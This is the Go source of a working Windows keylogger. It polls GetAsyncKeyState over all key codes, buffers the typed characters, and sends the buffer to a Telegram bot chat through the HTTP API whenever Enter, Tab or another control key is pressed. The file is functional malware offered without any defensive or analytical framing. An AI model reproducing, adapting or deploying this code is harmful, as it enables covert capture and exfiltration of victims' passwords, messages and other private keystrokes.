package main

import (
	"bytes"
	"fmt"
	"net/http"
	"os"
	"time"

	"golang.org/x/sys/windows"
)

var (
	moduser32            = windows.NewLazyDLL("user32.dll")
	procGetAsyncKeyState = moduser32.NewProc("GetAsyncKeyState")
)

func SendMessage(msg string) error {
	token := os.Getenv("TELEGRAM_TOKEN")
	chatID := os.Getenv("TELEGRAM_CHAT_ID")

	if token == "" || chatID == "" {
		return fmt.Errorf("TELEGRAM_TOKEN or TELEGRAM_CHAT_ID not set")
	}

	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s", token, chatID, msg)
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	return nil
}

func writeKey(i rune, buf *bytes.Buffer) error {
	var err error

	// See ASCII table for more information https://elcodigoascii.com.ar/

	// If the key is a printable character write it to the buffer.
	if i >= ' ' && i <= 0xFF {
		buf.WriteRune(i)
	} else if i == 0x08 {
		// If the key is a backspace remove the last character from the buffer.
		buf.Truncate(buf.Len() - 1)
	} else if i < ' ' {
		// If the key is not printable, as intro, tab, etc send buffer by telegram.
		err = SendMessage(buf.String())
		buf.Reset()
	}

	return err
}

func main() {
	var buf bytes.Buffer

	for {
		// Query key mapped to integer `0x00` to `0xFF` if it's pressed.
		for i := 0; i < 0xFF; i++ {
			asynch, _, _ := procGetAsyncKeyState.Call(uintptr(i))

			// If the least significant bit is set ignore it.
			//
			// As it's written in the documentation:
			// `if the least significant bit is set, the key was pressed after the previous call to GetAsyncKeyState.`
			// Which we don't care about :)
			if asynch&0x1 == 0 {
				continue
			}

			// Write i to buffer.
			err := writeKey(rune(i), &buf)

			if err != nil {
				panic(err)
			}
		}

		// Prevents 100% CPU usage.
		time.Sleep(5 * time.Microsecond)
	}
}
